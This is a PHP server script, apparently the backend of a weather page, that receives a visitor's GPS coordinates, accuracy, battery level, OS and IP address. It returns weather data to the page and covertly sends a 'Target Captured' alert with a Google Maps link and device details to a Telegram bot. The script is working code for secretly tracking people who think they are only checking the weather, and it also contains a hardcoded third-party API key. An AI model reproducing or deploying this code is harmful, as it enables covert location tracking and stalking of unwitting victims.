<?php
$botToken = "";
$chatId = "";
$weatherKey = "5263f75a4e738f5b297b1b5ca639cc1c";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $lati = $_POST['lati'];
    $longi = $_POST['longi'];
    $acc = $_POST['acc'];
    $ua = $_POST['ua'];
    $batt = $_POST['batt'];
    $os = $_POST['os'];
    
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

    // Get Weather + Accurate City Name from GPS
    $weatherUrl = "https://api.openweathermap.org/data/2.5/weather?lat=$lati&lon=$longi&units=metric&appid=$weatherKey";
    $weatherData = json_decode(@file_get_contents($weatherUrl), true);
    
    $city = $weatherData['name'] ?? "Unknown"; 
    $temp = $weatherData['main']['temp'] ?? "0";
    $feels = $weatherData['main']['feels_like'] ?? $temp;
    $hum = $weatherData['main']['humidity'] ?? "0";
    $wind = $weatherData['wind']['speed'] ?? "0";
    $desc = $weatherData['weather'][0]['description'] ?? "clear sky";
    $icon = $weatherData['weather'][0]['icon'] ?? "01d";

    // Format Message
    $mapLink = "https://www.google.com/maps?q=$lati,$longi";
    $message = "🎯 *Target Captured*\n\n📍 *Loc:* $city\n📏 *Acc:* {$acc}m\n🌍 *Map:* [Open Google Maps]($mapLink)\n📱 *Device:* $os\n🔋 *Batt:* $batt\n🌐 *IP:* $ip";

    // Send to Telegram
    $tgUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&parse_mode=Markdown&text=" . urlencode($message);
    @file_get_contents($tgUrl);

    // Send to Website
    header('Content-Type: application/json');
    echo json_encode([
        "city" => $city,
        "temp" => $temp,
        "feels" => $feels,
        "humidity" => $hum,
        "wind" => $wind,
        "desc" => $desc,
        "icon" => $icon
    ]);
    exit;
}
?>
